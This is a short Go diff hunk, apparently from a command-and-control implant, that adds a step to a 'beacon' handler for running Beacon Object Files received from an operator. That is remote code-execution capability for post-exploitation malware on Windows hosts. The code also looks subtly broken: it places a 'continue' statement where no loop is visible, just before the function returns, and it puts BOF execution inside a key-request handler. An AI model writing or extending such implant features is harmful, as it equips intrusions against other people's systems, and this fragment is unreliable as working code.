@@ -240,6 +240,13 @@ func handleKeysRequest(beacon io.ReadWriteCloser, agentID string) error {
 	}
 
 	cache = ""
+	
+	// Execute BOFs
+	if err := windows_utils.HandleBOFExecuteRequest(beacon, agentID); err != nil {
+		client_utils.HandleError(beacon, "bof", err)
+		continue
+	}
+	
 	return nil
 }
 
